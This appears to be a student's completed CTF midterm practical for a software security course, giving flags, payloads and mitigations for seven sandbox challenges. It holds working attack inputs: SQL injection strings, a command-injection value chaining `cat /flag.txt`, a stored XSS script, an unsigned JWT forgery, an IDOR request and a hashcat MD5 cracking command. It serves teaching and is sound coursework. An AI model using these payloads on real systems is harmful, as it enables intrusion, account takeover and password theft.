# Midterm — Hands-on CTF Practical (Week 9)

**Course:** Software Security (KOSEN69) · **Covers:** Weeks 1–6
**Time:** 150 min · **Total:** 100 pts · **Individual** · Sandbox targets only (ethics policy applies).

**Name:** Sadayu Suriya  **Student ID:** 6631503040

> Each challenge yields a **flag** in the form `FLAG{...}` (or the proof noted). Submit, per challenge: the **flag**, the **payload/command** you used, and a **one-line mitigation**. Partial credit for documented progress without the flag.

![A CTF scoreboard diagram showing the Week 9 midterm practical's four graded categories, their point weights, source labs, the mechanism each flag actually tests, and their link to the Week 8 written exam sections.](img/ctf-categories.svg)

**Targets (started by the instructor):**
- Injection / Auth: `labs/week04-injection` and `labs/week06-authn-authz` apps (`docker compose up`)
- XSS: `labs/week05-xss-client-side` app
- Crypto: `labs/week03-cryptography` (`hashes.txt`, the ECB oracle)

---

## Challenges

| # | Title | Topic | Pts |
|---|-------|-------|-----|
| 1 | **Boolean Bypass** — log in as `admin` without the password | SQLi (W4) | 15 |
| 2 | **Shell Out** — read a file via the `host` parameter | Command injection (W4) | 15 |
| 3 | **Pop the Alert** — fire `alert(document.domain)` stored for another user | Stored XSS (W5) | 15 |
| 4 | **Not Your Order** — read another user's order object | IDOR (W6) | 15 |
| 5 | **Forge Ahead** — become admin with a forged JWT | Broken JWT (W6) | 15 |
| 6 | **Crack It** — recover a password from a weak hash | Crypto (W3) | 15 |
| 7 | **Penguin** — recover the plaintext structure from the ECB oracle | Crypto (W3) | 10 |

**Submission table (fill in):**

| # | Flag / proof | Payload or command | Mitigation (1 line) |
|---|---|---|---|
| 1 | `FLAG{sqli_ea913053}` (my assigned target, `10.66.0.1:30003`) — also confirmed the simpler boolean bypass logs in as admin with "Welcome admin", no password needed | `GET /search?q=' UNION SELECT username,password FROM users--` (dumps every user's password column, including admin's, which is the flag). Boolean-bypass variant: `GET /login?user=admin'--&pw=x` | Both work because my input gets pasted straight into the SQL string with no escaping — the `'` breaks out of the intended string and `UNION`/`--` let me add my own query or comment out the rest. Fix: use parameterized queries instead of string-concatenating input into SQL. |
| 2 | `FLAG{cmdi_dd311ca3}` (my assigned target, `10.66.0.1:30003`) | `GET /ping?host=127.0.0.1;cat /flag.txt` | The server runs my `host` value inside a real shell, so `;` lets me chain a second command after the ping. Fix: never run `subprocess` with `shell=True` on user input — pass the command as a list of args, or check the value first. |
| 3 | Popup showed `localhost` (that's `document.domain`) | `<script>alert(document.domain)</script>` posted to `/comments`, then reloaded in a separate incognito tab | The comment gets saved and pasted into the page for every visitor with no escaping, so it runs again on anyone who opens the page — not just me. Fix: escape/encode whatever the user typed before putting it into the page (e.g. Jinja's autoescape). |
| 4 | `FLAG{idor_c395773f}` | `POST /login` as alice, then `GET /api/orders/2 -H "Authorization: Bearer <alice's token>"` | The endpoint never checks if the order actually belongs to whoever's asking — it just returns whatever `oid` you give it. Fix: check on the server that the order belongs to the logged-in user, every single time, not just that they're logged in. |
| 5 | `FLAG{jwt_abfbd409}` | `python -c "import jwt; print(jwt.encode({'sub':'admin'}, key='', algorithm='none'))"` then `GET /api/admin -H "Authorization: Bearer <forged>"` | The server accepts a token with `alg: none`, meaning it skips checking a signature at all, so I could just write `sub: admin` myself. Fix: only allow one signing algorithm (HS256), never accept `none`, and use a long random secret instead of a hardcoded word. |
| 6 | `password123` (cracked from `482c811da5d5b4bc6d497ffa98491e38`) | `hashcat.exe -m 0 -a 0 hashes.txt rockyou.txt --potfile-disable -o cracked.txt` — cracked all 4/4 hashes almost instantly | It's plain MD5 with no salt, so a fast wordlist attack just matches the hash straight to a known leaked password. Fix: hash passwords with something slow and salted, like bcrypt or argon2, not plain MD5. |
| 7 | Both ciphertext blocks came out identical: `3bfd04cc0d7ed55358e2cbe19de21383` = `3bfd04cc0d7ed55358e2cbe19de21383` | `from vulnerable_crypto import encrypt_ecb; ct = encrypt_ecb(b"A"*16 + b"A"*16); ct[0:16]==ct[16:32]` → `True` | ECB encrypts every 16-byte block on its own with no connection to the other blocks, so the same plaintext block always turns into the same ciphertext block — that's a repeating pattern anyone can see without ever knowing the key. Fix: use CBC (with a random IV) or an authenticated mode like GCM instead of ECB. |

**AI tool disclosure:** I used Claude Code (Claude Sonnet 5) to help me figure out the payload/command for each challenge, but I ran every command myself and checked the result myself before writing it down here.



